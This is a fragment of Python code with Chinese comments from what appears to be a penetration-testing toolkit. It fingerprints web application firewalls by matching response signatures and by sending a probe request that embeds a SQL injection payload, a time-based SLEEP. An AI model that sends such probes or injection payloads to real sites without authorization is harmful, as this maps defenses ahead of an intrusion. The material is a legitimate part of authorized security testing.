    return cancel_task(task_id)


# ---------------------------------------------------------------------------
# WAF 识别
# ---------------------------------------------------------------------------
# 常见 WAF 指纹（响应头/特征串 → WAF 名称）
_WAF_RULES = [
    # (特征, WAF 名, 类型)
    ("Server: cloudflare", "Cloudflare", "server"),
    ("__cf_bm", "Cloudflare", "cookie"),
    ("cf-ray", "Cloudflare", "header"),
    ("Server: awselb", "AWS WAF (ELB)", "server"),
    ("Server: BigIP", "F5 BIG-IP ASM", "server"),
    ("X-Powered-By-ASPNET", "Microsoft IIS/ASP.NET", "server"),
    ("Server: Microsoft-IIS", "IIS", "server"),
    ("Server: nginx", "Nginx", "server"),
    ("Server: openresty", "OpenResty (常配 WAF)", "server"),
    ("Server: AliyunOSS", "阿里云 OSS/WAF", "server"),
    ("Server: Tengine", "Tengine (阿里)", "server"),
    ("X-Safe-Firewall", "安全狗 (Safedog)", "header"),
    ("safedog", "安全狗 (Safedog)", "cookie"),
    ("X-D-Server", "D盾 (D-Safe)", "header"),
    ("360wzws", "360 网站卫士", "cookie"),
    ("X-Powered-Cdn", "加速乐 (Jiasule)", "header"),
    ("__jsluid_s", "加速乐 Jiasule CDN/WAF", "cookie"),
    ("__jsl_clearance", "加速乐 Jiasule", "cookie"),
    ("X-Cdn-Src-Port", "百度云加速", "header"),
    ("Yundun", "阿里云盾 (Yundun)", "cookie"),
    ("X-Cache: bypass", "CDN 缓存 (疑似 WAF)", "header"),
    ("telerik", "Telerik", "cookie"),
    ("Triggered", "腾讯云 WAF", "body"),
    ("waf.tencent", "腾讯云 WAF", "header"),
    ("ksyun-waf", "金山云 WAF", "header"),
    ("wangzhan.360", "360 网站卫士", "header"),
    ("Blocked by WAF", "通用 WAF", "body"),
    ("Mod_Security", "ModSecurity", "header"),
    ("Server: ATS", "Apache Traffic Server", "server"),
    ("Server: Varnish", "Varnish (CDN)", "server"),
]


def waf_detect(engine: YakEngine, url: str, timeout: float = 15) -> dict:
    """
    WAF 识别: 对目标发正常请求 + 恶意探测请求，比对响应特征判断 WAF。
    返回: {waf_found, wafs[], evidence, blocked}
    """
    stub = engine.connect()
    try:
        from urllib.parse import urlparse
        parsed = urlparse(url)
        host = parsed.netloc or url
        path = parsed.path or "/"
        # 构造请求
        normal_req = f"GET {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\nAccept: */*\r\nConnection: close\r\n\r\n"
        evil_req = f"GET {path}?id=1%27%20OR%20%271%27%3D%271%27%20AND%20(SELECT%201%20FROM%20(SELECT%20SLEEP(3))a)--%20 HTTP/1.1\r\nHost: {host}\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\nConnection: close\r\n\r\n"

        def _send(pkt):
            req = ypb.FuzzerRequest()
            req.Request = pkt.encode("utf-8")
            req.IsHTTPS = url.startswith("https")
            req.NoSystemProxy = True
            req.PerRequestTimeoutSeconds = timeout
            for resp in stub.HTTPFuzzer(req, timeout=timeout + 10):
                if resp.ResponseRaw:
                    return resp.ResponseRaw.decode("utf-8", errors="replace")
            return ""

        normal_resp = _send(normal_req)
        evil_resp = _send(evil_req)

        found = []
        evidence = []
        # 正常响应特征
        for pattern, name, typ in _WAF_RULES:
            if pattern.lower() in (normal_resp + evil_resp).lower():
                found.append(name)
                evidence.append(f"{name}: 命中特征 {pattern}")
        # 恶意请求被拦截（状态码异常/返回拦截页）
        blocked = False
        normal_status = normal_resp.split("\r\n")[0][:50] if normal_resp else ""
        evil_status = evil_resp.split("\r\n")[0][:50] if evil_resp else ""
        if evil_resp and "403" in evil_status or "406" in evil_status or "418" in evil_status:
            blocked = True
            evidence.append(f"恶意请求被拦截: {evil_status}")
        if evil_resp and len(evil_resp) < 500 and normal_resp and len(normal_resp) > 500:
            blocked = True
            evidence.append("恶意请求响应明显小于正常响应（疑似 WAF 拦截）")

        return {
            "ok": True,
            "url": url,
            "waf_found": bool(found) or blocked,
            "wafs": list(dict.fromkeys(found)),
            "blocked": blocked,
            "evidence": evidence[:10],
            "normal_status": normal_status,
            "evil_status": evil_status,
        }
    except Exception as e:
        return {"ok": False, "reason": repr(e)}
